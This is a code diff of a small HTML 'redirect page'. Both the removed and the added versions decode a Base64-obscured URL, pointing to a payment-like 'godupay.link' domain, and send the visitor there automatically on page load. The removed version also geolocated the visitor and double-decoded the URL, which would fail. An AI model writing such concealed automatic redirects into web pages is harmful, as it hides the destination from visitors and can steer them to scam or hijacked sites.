@@ -1,10 +1,11 @@
-
 <!DOCTYPE html>
 <html>
-<head>
-  <title>正在跳转请稍后....</title>
-	
-<!-- Global site tag (gtag.js) - Google Analytics -->
+  <head>
+    <meta charset="UTF-8">
+    <title>跳转页面</title>
+  </head>
+  <body>
+	  <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-145418913-1"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -14,33 +15,11 @@
   gtag('config', 'UA-145418913-1');
 </script>
 
-  <script>
-    function redirectToPage() {
-      const redirectUrlChina = atob('aHR0cHM6Ly9hLmFhLmEuYS5nb2R1cGF5Lmxpbmsv'); // Base64 解码
-      const redirectUrlOther = atob('aHR0cHM6Ly9hLmFhLmEuYS5nb2R1cGF5Lmxpbmsv'); // Base64 解码
-      fetch('https://ipinfo.io/json')
-        .then(response => {
-          if (!response.ok) {
-            throw new Error('访问IP信息API失败');
-          }
-          return response.json();
-        })
-        .then(data => {
-          const { country } = data;
-          if (country === 'CN') {
-            window.location.href = atob(redirectUrlChina); // Base64 解码
-          } else {
-            window.location.href = atob(redirectUrlOther); // Base64 解码
-          }
-        })
-        .catch(error => {
-          console.error(error);
-          window.location.href = atob('aHR0cHM6Ly9hLmFhLmEuYS5nb2R1cGF5Lmxpbmsv'); // Base64 解码
-        });
-    }
-  </script>
-</head>
-<body onload="redirectToPage()">
-  <h1>正在跳转请稍后......</h1>
-</body>
+    <script>
+      var url = "aHR0cHM6Ly9hLmFhLmEuYS5nb2R1cGF5Lmxpbmsv";
+      var decodedUrl = atob(url); // 对 URL 进行 Base64 解码
+      window.location.href = decodedUrl; // 跳转到解码后的 URL
+    </script>
+	  
+  </body>
 </html>
